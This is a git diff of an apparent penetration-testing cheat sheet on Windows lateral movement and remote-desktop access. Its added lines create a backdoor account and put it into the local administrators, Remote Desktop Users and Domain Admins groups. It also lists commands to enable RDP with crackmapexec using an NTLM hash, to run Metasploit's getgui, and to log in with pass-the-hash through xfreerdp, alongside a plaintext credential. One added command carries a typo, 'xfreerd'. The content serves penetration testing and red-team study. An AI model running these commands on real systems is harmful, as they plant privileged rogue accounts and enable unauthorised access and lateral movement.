@@ -3,8 +3,10 @@
 ## TIP 1 - Create your credential :D
 
 ```powershell
-net user hacker hacker /add
+net user hacker hacker1234* /add
 net localgroup administrators hacker /add
+net localgroup "Remote Desktop Users" hacker /add
+net group "Domain Admins" hacker /add /domain
 ```
 
 Some info about your user
@@ -93,7 +95,9 @@ python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
 
 ```powershell
 python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
-rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5
+rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5 -g 70 -r disk:share=/home/user/myshare
+# -g : the screen will take up 70% of your actual screen size
+# -r disk:share : sharing a local folder during a remote desktop session 
 ```
 
 Note: you may need to enable it with the following command
@@ -116,17 +120,19 @@ or with crackmapexec
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
 ```
 
-For Server 2012 R2, Win8.1+
-
-```powershell
-xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
-```
-
-with Metasploit
+or with Metasploit
 
 ```powershell
 run getgui -u admin -p 1234
 ```
+
+Then log in using xfreerdp 
+
+```powershell
+xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
+ xfreerd /u:runner /v:10.0.0.1 # password will be asked
+```
+
 
 ## Netuse (Windows)
 
